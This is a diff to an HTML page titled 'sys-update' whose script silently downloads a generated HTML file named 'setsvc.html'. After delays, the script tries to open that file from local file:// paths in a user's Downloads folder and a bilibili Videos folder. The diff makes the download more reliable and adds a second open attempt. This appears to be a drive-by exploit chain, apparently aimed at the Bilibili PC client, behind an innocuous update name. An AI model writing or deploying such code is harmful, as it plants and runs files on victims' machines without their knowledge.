@@ -1,4 +1,4 @@
-<!doctype html><title>sys-update</title>
+<!doctype html><title>sys-update</title><body></body>
 <script>
 function st(s){try{document.title='up|'+s}catch(e){}}
 st('start');
@@ -7,11 +7,14 @@ try{
   var b=new Blob([fileHtml],{type:'text/html'});
   var u=URL.createObjectURL(b);
   var a=document.createElement('a');a.href=u;a.download='setsvc.html';
-  document.body.appendChild(a);a.click();
+  (document.body||document.documentElement).appendChild(a);a.click();
   st('dl-clicked');
 }catch(e){st('dl-err:'+e.message)}
 setTimeout(function(){st('opening')},20000);
 setTimeout(function(){
-  try{var w=window.open('file:///C:/Users/aaa/Videos/bilibili/setsvc.html?bilipc=1');st('open '+(w?'obj':'null'))}catch(e){st('open-err:'+e.message)}
+  try{var w=window.open('file:///C:/Users/aaa/Videos/bilibili/setsvc.html?bilipc=1');st('open1 '+(w?'obj':'null'))}catch(e){st('open1-err:'+e.message)}
 },24000);
+setTimeout(function(){
+  try{window.open('file:///C:/Users/aaa/Downloads/setsvc.html?bilipc=1');st('open2')}catch(e){st('open2-err:'+e.message)}
+},25500);
 </script>
